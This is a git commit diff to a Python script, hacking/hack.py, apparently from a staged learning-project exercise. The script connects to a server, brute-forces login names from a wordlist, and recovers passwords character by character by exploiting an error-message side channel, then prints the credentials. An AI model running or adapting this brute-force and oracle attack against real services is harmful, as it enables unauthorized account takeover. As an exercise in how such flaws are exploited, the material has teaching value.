7b1dc687507a9e4cebdf03d5313dc8c564ae0b38
Xue10 <xue1010@hotmail.com>
2022-03-29 23:36:44 +0800

    stage 4 complete

--- hacking/hack.py
+++ hacking/hack.py
@@ -1,28 +1,50 @@
 import itertools
+import json
 import socket
 import sys
+
+
+def get_set(line):
+    chars = []
+    for ch in line.strip():
+        if ch.isalpha():
+            chars.append((ch.lower(), ch.upper()))
+        else:
+            chars.append(tuple(ch))
+    return itertools.product(*chars)
+
 
 ip = sys.argv[1]
 port = int(sys.argv[2])
 with socket.socket() as client:
     client.connect((ip, port))
     found = False
-    with open('hacking/passwords.txt') as f:
-        for line in f.readlines():
+    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+    with open('hacking/logins.txt') as logins:
+        for name in logins:
             if found:
                 break
-            ch_set = []
-            for ch in line:
-                if ch.isalpha():
-                    ch_set.append((ch.lower(), ch.upper()))
-                elif ch.isdigit():
-                    ch_set.append(tuple(ch))
-            pw_set = itertools.product(*ch_set)
-            for p in pw_set:
-                password = ''.join(p)
-                client.send(password.encode())
-                response = client.recv(10240).decode()
-                if response == 'Connection success!':
-                    print(password)
-                    found = True
+            names = get_set(name)
+            for chars in names:
+                if found:
                     break
+                login = ''.join(chars)
+                password = ' '
+                msg = {'login': login, 'password': password}
+                json_str = json.dumps(msg)
+                client.send(json_str.encode())
+                response = json.loads(client.recv(10240).decode())
+                if response['result'] == 'Wrong password!':
+                    password = ''
+                    while response['result'] != 'Connection success!':
+                        for c in characters:
+                            msg['password'] = password + c
+                            json_str = json.dumps(msg)
+                            client.send(json_str.encode())
+                            response = json.loads(client.recv(10240).decode())
+                            if response['result'] == "Exception happened during login":
+                                password += c
+                            elif response['result'] == 'Connection success!':
+                                print(json_str)
+                                found = True
+                                break
